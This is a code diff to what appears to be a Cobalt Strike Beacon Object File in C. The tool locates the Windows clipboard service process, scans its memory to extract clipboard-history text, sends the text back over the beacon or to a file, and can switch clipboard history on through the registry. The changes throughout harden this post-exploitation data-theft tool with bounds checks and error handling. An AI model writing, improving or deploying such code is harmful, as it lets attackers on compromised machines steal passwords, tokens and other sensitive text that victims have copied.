@@ -3,6 +3,7 @@
 #include "beacon.h"
 
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#define MAX_CLIPBOARD_DATA_SIZE (4 * 1024 * 1024)
 
 typedef LONG NTSTATUS;
 
@@ -105,10 +106,10 @@ BOOL initializeAPIs() {
     HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
     HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
     HMODULE hPsapi = LoadLibraryA("psapi.dll");
-    
+
     if (!hNtdll || !hKernel32 || !hAdvapi32 || !hPsapi)
         return FALSE;
-    
+
     _NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
     _OpenProcessToken = (pOpenProcessToken)GetProcAddress(hAdvapi32, "OpenProcessToken");
     _GetTokenInformation = (pGetTokenInformation)GetProcAddress(hAdvapi32, "GetTokenInformation");
@@ -130,7 +131,7 @@ BOOL initializeAPIs() {
     _RegSetValueExA = (pRegSetValueExA)GetProcAddress(hAdvapi32, "RegSetValueExA");
     _RegCloseKey = (pRegCloseKey)GetProcAddress(hAdvapi32, "RegCloseKey");
     _RegQueryValueExA = (pRegQueryValueExA)GetProcAddress(hAdvapi32, "RegQueryValueExA");
-    
+
     if (!_NtQueryInformationProcess || !_OpenProcessToken || !_GetTokenInformation ||
         !_LocalAlloc || !_LocalFree || !_CloseHandle || !_LookupAccountSidA ||
         !_OpenSCManagerA || !_GetLastError || !_EnumServicesStatusExA ||
@@ -139,7 +140,7 @@ BOOL initializeAPIs() {
         !_VirtualQueryEx || !_RegOpenKeyExA || !_RegSetValueExA ||
         !_RegCloseKey || !_RegQueryValueExA)
         return FALSE;
-    
+
     return TRUE;
 }
 
@@ -148,25 +149,31 @@ BOOL getUserFromProcess(HANDLE hProcess, LPSTR* ppUser) {
     PTOKEN_USER pTokenUser = NULL;
     DWORD dwTokenUserSize = 0;
     BOOL bSuccess = FALSE;
-    
+
     if (!_OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
         return FALSE;
     }
-    
+
     _GetTokenInformation(hToken, TokenUser, NULL, 0, &dwTokenUserSize);
+    // Guard: first call always fails; dwTokenUserSize == 0 means the query itself failed
+    if (dwTokenUserSize == 0) {
+        _CloseHandle(hToken);
+        return FALSE;
+    }
+
     pTokenUser = (PTOKEN_USER)_LocalAlloc(LPTR, dwTokenUserSize);
     if (!pTokenUser) {
         _CloseHandle(hToken);
         return FALSE;
     }
-    
+
     if (_GetTokenInformation(hToken, TokenUser, pTokenUser, dwTokenUserSize, &dwTokenUserSize)) {
         CHAR szName[MAX_PATH];
         CHAR szDomain[MAX_PATH];
         DWORD dwNameSize = sizeof(szName);
         DWORD dwDomainSize = sizeof(szDomain);
         SID_NAME_USE eSidType;
-        
+
         if (_LookupAccountSidA(NULL, pTokenUser->User.Sid, szName, &dwNameSize, szDomain, &dwDomainSize, &eSidType)) {
             *ppUser = (LPSTR)malloc((dwNameSize + dwDomainSize + 2));
             if (*ppUser) {
@@ -175,21 +182,23 @@ BOOL getUserFromProcess(HANDLE hProcess, LPSTR* ppUser) {
             }
         }
     }
-    
+
     _LocalFree(pTokenUser);
     _CloseHandle(hToken);
     return bSuccess;
 }
 
 BOOL serviceNameStartsWith(LPCSTR serviceName, LPCSTR prefix) {
+    if (!serviceName || !prefix) return FALSE;
+
     SIZE_T prefixLen = 0;
     while (prefix[prefixLen] != '\0') prefixLen++;
-    
+
     for (SIZE_T i = 0; i < prefixLen; i++) {
         if (serviceName[i] == '\0' || serviceName[i] != prefix[i])
             return FALSE;
     }
-    
+
     return TRUE;
 }
 
@@ -200,35 +209,49 @@ DWORD getClipboardSvcProcessID() {
     DWORD dwBytesNeeded = 0;
     DWORD dwServicesReturned = 0;
     DWORD dwResumeHandle = 0;
-    
+
     hSCManager = _OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
     if (hSCManager == NULL) {
         BeaconPrintf(CALLBACK_OUTPUT, "OpenSCManager failed with error %d\n", _GetLastError());
         return 0;
     }
-    
+
     if (!_EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle, NULL) &&
         _GetLastError() != ERROR_MORE_DATA) {
         BeaconPrintf(CALLBACK_OUTPUT, "EnumServicesStatusEx failed with error %d\n", _GetLastError());
         _CloseServiceHandle(hSCManager);
         return 0;
     }
-    
+
+    if (dwBytesNeeded == 0) {
+        _CloseServiceHandle(hSCManager);
+        return 0;
+    }
+
     pServices = (ENUM_SERVICE_STATUS_PROCESS*)malloc(dwBytesNeeded);
+    if (!pServices) {
+        _CloseServiceHandle(hSCManager);
+        return 0;
+    }
+
+    // Reset handle so the second call enumerates from the beginning
+    dwResumeHandle = 0;
+    dwServicesReturned = 0;
+
     if (!_EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (LPBYTE)pServices, dwBytesNeeded, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle, NULL)) {
         BeaconPrintf(CALLBACK_OUTPUT, "EnumServicesStatusEx failed with error %d\n", _GetLastError());
         free(pServices);
         _CloseServiceHandle(hSCManager);
         return 0;
     }
-    
+
     for (DWORD i = 0; i < dwServicesReturned; i++) {
         if (serviceNameStartsWith(pServices[i].lpServiceName, "cbdhsvc")) {
             clipboardSvcPID = pServices[i].ServiceStatusProcess.dwProcessId;
             break;
         }
     }
-    
+
     free(pServices);
     _CloseServiceHandle(hSCManager);
     return clipboardSvcPID;
@@ -238,7 +261,7 @@ BOOL getProcessCommandLine(HANDLE hProcess, CHAR *szCommandLine, DWORD nSize) {
     PROCESS_BASIC_INFORMATION pbi = {0};
     ULONG ulReturnLength;
     NTSTATUS status = _NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ulReturnLength);
-    
+
     if (status == STATUS_SUCCESS) {
         PEB peb;
         SIZE_T bytesRead;
@@ -246,8 +269,13 @@ BOOL getProcessCommandLine(HANDLE hProcess, CHAR *szCommandLine, DWORD nSize) {
             RTL_USER_PROCESS_PARAMETERS upp;
             if (_ReadProcessMemory(hProcess, peb.ProcessParameters, &upp, sizeof(upp), &bytesRead)) {
                 WCHAR wszCommandLine[MAX_PATH];
-                if (_ReadProcessMemory(hProcess, upp.CommandLine.Buffer, wszCommandLine, nSize, &bytesRead)) {
-                    wszCommandLine[bytesRead / sizeof(WCHAR)] = L'\0';
+                // Use the local buffer size, not the caller's nSize, to prevent stack overflow
+                DWORD readSize = sizeof(wszCommandLine) - sizeof(WCHAR);
+                if (nSize < readSize) readSize = nSize - sizeof(WCHAR);
+                if (_ReadProcessMemory(hProcess, upp.CommandLine.Buffer, wszCommandLine, readSize, &bytesRead)) {
+                    DWORD wcharCount = (DWORD)(bytesRead / sizeof(WCHAR));
+                    if (wcharCount >= MAX_PATH) wcharCount = MAX_PATH - 1;
+                    wszCommandLine[wcharCount] = L'\0';
                     _WideCharToMultiByte(CP_ACP, 0, wszCommandLine, -1, szCommandLine, nSize, NULL, NULL);
                     return TRUE;
                 }
@@ -258,9 +286,15 @@ BOOL getProcessCommandLine(HANDLE hProcess, CHAR *szCommandLine, DWORD nSize) {
 }
 
 char* wideToUtf8(const WCHAR* wideStr) {
+    if (!wideStr) return NULL;
     int utf8Size = _WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
+    if (utf8Size <= 0) return NULL;
     char* utf8Str = (char*)malloc(utf8Size);
-    _WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Size, NULL, NULL);
+    if (!utf8Str) return NULL;
+    if (_WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Size, NULL, NULL) == 0) {
+        free(utf8Str);
+        return NULL;
+    }
     return utf8Str;
 }
 
@@ -269,21 +303,29 @@ BOOL isWithinRdataSection(HANDLE hProcess, HMODULE hModule, DWORD_PTR address) {
     IMAGE_DOS_HEADER dosHeader = {0};
     IMAGE_NT_HEADERS ntHeaders = {0};
     SIZE_T bytesRead;
-    
+
+    if (!hModule)
+        return FALSE;
+
     if (!_ReadProcessMemory(hProcess, hModule, &dosHeader, sizeof(IMAGE_DOS_HEADER), &bytesRead))
         return result;
-    
+
     if (!_ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)hModule + dosHeader.e_lfanew), &ntHeaders, sizeof(IMAGE_NT_HEADERS), &bytesRead))
         return result;
-    
+
     WORD numSections = ntHeaders.FileHeader.NumberOfSections;
+    if (numSections == 0)
+        return result;
+
     PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)malloc(numSections * sizeof(IMAGE_SECTION_HEADER));
-    
+    if (!sectionHeaders)
+        return result;
+
     if (!_ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)hModule + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS)), sectionHeaders, numSections * sizeof(IMAGE_SECTION_HEADER), &bytesRead)) {
         free(sectionHeaders);
         return result;
     }
-    
+
     for (WORD i = 0; i < numSections; i++) {
         if (strncmp((const char *)sectionHeaders[i].Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0) {
             DWORD_PTR sectionStart = (DWORD_PTR)hModule + sectionHeaders[i].VirtualAddress;
@@ -293,20 +335,19 @@ BOOL isWithinRdataSection(HANDLE hProcess, HMODULE hModule, DWORD_PTR address) {
             break;
         }
     }
-    
+
     free(sectionHeaders);
     return result;
 }
 
 void clipboardHistoryDump(const char* outputPath) {
-    DWORD aProcesses[1024], cbNeeded, cProcesses;
     HMODULE hMod;
     FILE* outputFile = NULL;
     char* outputBuffer = NULL;
     size_t bufferSize = 1024 * 1024;
     size_t currentPos = 0;
     BOOL headerPrinted = FALSE;
-    
+
     if (outputPath != NULL) {
         outputFile = fopen(outputPath, "w");
         if (outputFile == NULL) {
@@ -321,12 +362,12 @@ void clipboardHistoryDump(const char* outputPath) {
         }
         outputBuffer[0] = '\0';
     }
-    
+
     DWORD clipboardSvcPID = getClipboardSvcProcessID();
     if (clipboardSvcPID == 0) {
         goto exit;
     }
-    
+
     HANDLE hProcess = _OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, clipboardSvcPID);
     if (hProcess != NULL) {
         LPSTR pUser = NULL;
@@ -344,45 +385,68 @@ void clipboardHistoryDump(const char* outputPath) {
                 fprintf(outputFile, "Failed to get the username.\n");
             }
         }
-        
+
         MEMORY_BASIC_INFORMATION memInfo;
         HMODULE hWindowsDataTransferDll = NULL;
         DWORD cbNeededModules;
-        
-        if (_EnumProcessModules(hProcess, NULL, 0, &cbNeededModules)) {
+
+        if (_EnumProcessModules(hProcess, NULL, 0, &cbNeededModules) && cbNeededModules > 0) {
             HMODULE *hMods = (HMODULE *)malloc(cbNeededModules);
-            if (_EnumProcessModules(hProcess, hMods, cbNeededModules, &cbNeededModules)) {
-                for (unsigned int k = 0; k < cbNeededModules / sizeof(HMODULE); k++) {
-                    CHAR szModuleName[MAX_PATH];
-                    if (_GetModuleBaseNameA(hProcess, hMods[k], szModuleName, sizeof(szModuleName))) {
-                        SIZE_T len = 0;
-                        while (szModuleName[len] != '\0') {
-                            if (szModuleName[len] >= 'A' && szModuleName[len] <= 'Z')
-                                szModuleName[len] = szModuleName[len] + ('a' - 'A');
-                            len++;
-                        }
-                        
-                        if (strcmp(szModuleName, "windows.applicationmodel.datatransfer.dll") == 0) {
-                            hWindowsDataTransferDll = hMods[k];
-                            break;
+            if (hMods) {
+                if (_EnumProcessModules(hProcess, hMods, cbNeededModules, &cbNeededModules)) {
+                    for (unsigned int k = 0; k < cbNeededModules / sizeof(HMODULE); k++) {
+                        CHAR szModuleName[MAX_PATH];
+                        if (_GetModuleBaseNameA(hProcess, hMods[k], szModuleName, sizeof(szModuleName))) {
+                            SIZE_T len = 0;
+                            while (szModuleName[len] != '\0') {
+                                if (szModuleName[len] >= 'A' && szModuleName[len] <= 'Z')
+                                    szModuleName[len] = szModuleName[len] + ('a' - 'A');
+                                len++;
+                            }
+
+                            if (strcmp(szModuleName, "windows.applicationmodel.datatransfer.dll") == 0) {
+                                hWindowsDataTransferDll = hMods[k];
+                                break;
+                            }
                         }
                     }
                 }
+                free(hMods);
             }
-            free(hMods);
         }
-        
-        for (LPVOID addr = 0; _VirtualQueryEx(hProcess, addr, &memInfo, sizeof(memInfo)) == sizeof(memInfo); addr = (LPVOID)((DWORD_PTR)addr + memInfo.RegionSize)) {
+
+        // Skip the scan entirely if the target DLL wasn't found
+        if (hWindowsDataTransferDll == NULL) {
+            BeaconPrintf(CALLBACK_OUTPUT, "windows.applicationmodel.datatransfer.dll not found in target process.\n");
+            _CloseHandle(hProcess);
+            goto exit;
+        }
+
+        for (LPVOID addr = 0; _VirtualQueryEx(hProcess, addr, &memInfo, sizeof(memInfo)) == sizeof(memInfo); ) {
+            // Guard against infinite loop from zero-size regions or address wrap-around
+            if (memInfo.RegionSize == 0)
+                break;
+            DWORD_PTR nextAddr = (DWORD_PTR)addr + memInfo.RegionSize;
+            if (nextAddr <= (DWORD_PTR)addr)
+                break;
+
             if (memInfo.State == MEM_COMMIT && memInfo.Type == MEM_PRIVATE && memInfo.Protect == PAGE_READWRITE) {
                 BYTE *buffer = (BYTE *)malloc(memInfo.RegionSize);
+                if (!buffer) {
+                    addr = (LPVOID)nextAddr;
+                    continue;
+                }
+
                 SIZE_T bytesRead;
-                
-                if (_ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer, memInfo.RegionSize, &bytesRead)) {
-                    for (SIZE_T j = 0; j < bytesRead - sizeof(BYTE); j++) {
+
+                if (_ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer, memInfo.RegionSize, &bytesRead) &&
+                    bytesRead > 0x20) {
+                    // Loop bound keeps j+0x20 within bytesRead, preventing OOB on buffer[j+0x20]
+                    for (SIZE_T j = 0; j < bytesRead - 0x20; j++) {
                         DWORD_PTR rdataAddress;
                         DWORD_PTR textTypeAddress;
                         wchar_t textType[5];
-                        
+
                         if (
                             memcmp(buffer + j + 0x20, &endByte, sizeof(BYTE)) == 0 &&
                             _ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)memInfo.BaseAddress + j), &rdataAddress, sizeof(DWORD_PTR), NULL) &&
@@ -390,19 +454,21 @@ void clipboardHistoryDump(const char* outputPath) {
                             _ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)memInfo.BaseAddress + j + 8), &textTypeAddress, sizeof(DWORD_PTR), NULL) &&
                             _ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)textTypeAddress + 0x1c), &textType, textTypeLen, NULL) &&
                             wcscmp(textType, textTypeValue) == 0) {
-                            
+
                             LPVOID clipboardDataPtrAddress = (LPVOID)((DWORD_PTR)memInfo.BaseAddress + j + 0x18);
                             DWORD_PTR clipboardDataAddress;
-                            
+
                             if (_ReadProcessMemory(hProcess, clipboardDataPtrAddress, &clipboardDataAddress, sizeof(clipboardDataAddress), NULL)) {
                                 WCHAR* clipboardData = NULL;
                                 SIZE_T dataSize = 256;
                                 SIZE_T bytesRead1;
                                 SIZE_T totalBytesRead = 0;
                                 BOOL readCompleted = FALSE;
-                                
+
                                 clipboardData = (WCHAR*)malloc(dataSize * sizeof(WCHAR));
-                                
+                                if (!clipboardData)
+                                    continue;
+
                                 while (!readCompleted && totalBytesRead < dataSize * sizeof(WCHAR) - sizeof(WCHAR)) {
                                     if (_ReadProcessMemory(hProcess, (LPCVOID)(clipboardDataAddress + totalBytesRead), &clipboardData[totalBytesRead / sizeof(WCHAR)], sizeof(WCHAR), &bytesRead1)) {
                                         if (bytesRead1 == sizeof(WCHAR) && clipboardData[totalBytesRead / sizeof(WCHAR)] == L'\0')
@@ -411,76 +477,108 @@ void clipboardHistoryDump(const char* outputPath) {
                                             totalBytesRead += bytesRead1;
                                     } else
                                         break;
-                                    
+
                                     if (totalBytesRead == dataSize * sizeof(WCHAR) - sizeof(WCHAR)) {
+                                        // Cap growth to prevent unbounded memory consumption
+                                        if (dataSize * sizeof(WCHAR) >= MAX_CLIPBOARD_DATA_SIZE) {
+                                            readCompleted = TRUE;
+                                            break;
+                                        }
                                         dataSize *= 2;
-                                        clipboardData = (WCHAR*)realloc(clipboardData, dataSize * sizeof(WCHAR));
+                                        WCHAR* newData = (WCHAR*)realloc(clipboardData, dataSize * sizeof(WCHAR));
+                                        if (!newData) {
+                                            // Keep existing data, treat as complete
+                                            readCompleted = TRUE;
+                                            break;
+                                        }
+                                        clipboardData = newData;
                                     }
                                 }
-                                
+
                                 if (totalBytesRead > 0) {
                                     clipboardData[totalBytesRead / sizeof(WCHAR)] = L'\0';
                                     char* utf8Str = wideToUtf8(clipboardData);
-                                    
-                                    if (outputFile == NULL) {
-                                        if (!headerPrinted) {
-                                            size_t headerSize = 100;
-                                            if (currentPos + headerSize > bufferSize) {
-                                                bufferSize = (currentPos + headerSize) * 2;
-                                                outputBuffer = (char*)realloc(outputBuffer, bufferSize);
+
+                                    if (utf8Str != NULL) {
+                                        if (outputFile == NULL) {
+                                            if (!headerPrinted) {
+                                                size_t headerSize = 100;
+                                                if (currentPos + headerSize > bufferSize) {
+                                                    bufferSize = (currentPos + headerSize) * 2;
+                                                    char* newBuf = (char*)realloc(outputBuffer, bufferSize);
+                                                    if (!newBuf) { free(utf8Str); free(clipboardData); free(buffer); _CloseHandle(hProcess); goto exit; }
+                                                    outputBuffer = newBuf;
+                                                }
+                                                currentPos += wsprintfA(outputBuffer + currentPos, "======================= Clipboard Content ========================\n");
+                                                headerPrinted = TRUE;
                                             }
 
-                                            currentPos += wsprintfA(outputBuffer + currentPos, "======================= Clipboard Content ========================\n");
-                                            headerPrinted = TRUE;
+                                            size_t strLen = strlen(utf8Str);
+                                            size_t neededSize = strLen + 3; // \n\n\0
+                                            if (currentPos + neededSize > bufferSize) {
+                                                bufferSize = (currentPos + neededSize) * 2;
+                                                char* newBuf = (char*)realloc(outputBuffer, bufferSize);
+                                                if (!newBuf) { free(utf8Str); free(clipboardData); free(buffer); _CloseHandle(hProcess); goto exit; }
+                                                outputBuffer = newBuf;
+                                            }
 
+                                            // Use memcpy + manual append to avoid wsprintfA's 1024-char limit
+                                            memcpy(outputBuffer + currentPos, utf8Str, strLen);
+                                            currentPos += strLen;
+                                            outputBuffer[currentPos++] = '\n';
+                                            outputBuffer[currentPos++] = '\n';
+                                            outputBuffer[currentPos]   = '\0';
+                                        } else {
+                                            fprintf(outputFile, "%s\n", utf8Str);
                                         }
-                                        
-                                        size_t neededSize = strlen(utf8Str) + 10;
-                                        if (currentPos + neededSize > bufferSize) {
-                                            bufferSize = (currentPos + neededSize) * 2;
-                                            outputBuffer = (char*)realloc(outputBuffer, bufferSize);
-                                        }
-                                        
-                                        currentPos += wsprintfA(outputBuffer + currentPos, "%s\n\n", utf8Str);
-                                    } else {
-                                        fprintf(outputFile, "%s\n", utf8Str);
+
+                                        free(utf8Str);
                                     }
-                                    
-                                    free(utf8Str);
                                 }
-                                
+
                                 free(clipboardData);
                             }
                         }
                     }
                 }
-                
+
                 free(buffer);
             }
+
+            addr = (LPVOID)nextAddr;
         }
-        
+
         if (headerPrinted) {
             if (outputFile == NULL) {
-                size_t footerSize = 100;
+                size_t footerSize = 4;
                 if (currentPos + footerSize > bufferSize) {
                     bufferSize = (currentPos + footerSize) * 2;
-                    outputBuffer = (char*)realloc(outputBuffer, bufferSize);
+                    char* newBuf = (char*)realloc(outputBuffer, bufferSize);
+                    if (newBuf) {
+                        outputBuffer = newBuf;
+                        outputBuffer[currentPos++] = '\n';
+                        outputBuffer[currentPos]   = '\0';
+                    }
+                } else {
+                    outputBuffer[currentPos++] = '\n';
+                    outputBuffer[currentPos]   = '\0';
                 }
-                currentPos += wsprintfA(outputBuffer + currentPos, "\n");
             } else {
                 fprintf(outputFile, "\n");
             }
         }
-        
+
         _CloseHandle(hProcess);
-        
+
         if (outputFile == NULL && outputBuffer != NULL) {
             BeaconPrintf(CALLBACK_OUTPUT, "%s", outputBuffer);
         } else if (outputFile != NULL) {
             BeaconPrintf(CALLBACK_OUTPUT, "File saved to %s.\n", outputPath);
         }
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to open clipboard service process (PID %lu).\n", clipboardSvcPID);
     }
-    
+
 exit:
     if (outputFile != NULL)
         fclose(outputFile);
@@ -492,18 +590,18 @@ void enableClipboardHistory(BOOL enable) {
     HKEY hKey;
     const char* subKey = "SOFTWARE\\Microsoft\\Clipboard";
     DWORD value = enable ? 1 : 0;
-    
+
     if (_RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "Failed to open registry key.\n");
         return;
     }
-    
+
     if (_RegSetValueExA(hKey, "EnableClipboardHistory", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "Failed to set registry value.\n");
         _RegCloseKey(hKey);
         return;
     }
-    
+
     _RegCloseKey(hKey);
     if (enable)
         BeaconPrintf(CALLBACK_OUTPUT, "Clipboard history enabled.\n");
@@ -518,17 +616,17 @@ BOOL isClipboardHistoryEnabled() {
     DWORD value = 0;
     DWORD valueType;
     DWORD valueSize = sizeof(value);
-    
+
     if (_RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "Failed to open registry key.\n");
         return FALSE;
     }
-    
+
     if (_RegQueryValueExA(hKey, "EnableClipboardHistory", 0, &valueType, (BYTE*)&value, &valueSize) != ERROR_SUCCESS) {
         _RegCloseKey(hKey);
         return FALSE;
     }
-    
+
     _RegCloseKey(hKey);
     return value == 1;
 }
@@ -549,12 +647,12 @@ void go(char* args, int length) {
         BeaconPrintf(CALLBACK_ERROR, "Failed to initialize APIs\n");
         return;
     }
-    
+
     datap parser;
     BeaconDataParse(&parser, args, length);
     int argSize;
     char* command = BeaconDataExtract(&parser, &argSize);
-    
+
     if (command != NULL && argSize > 0) {
         if (!_stricmp("dump", command)) {
             if (!isClipboardHistoryEnabled())
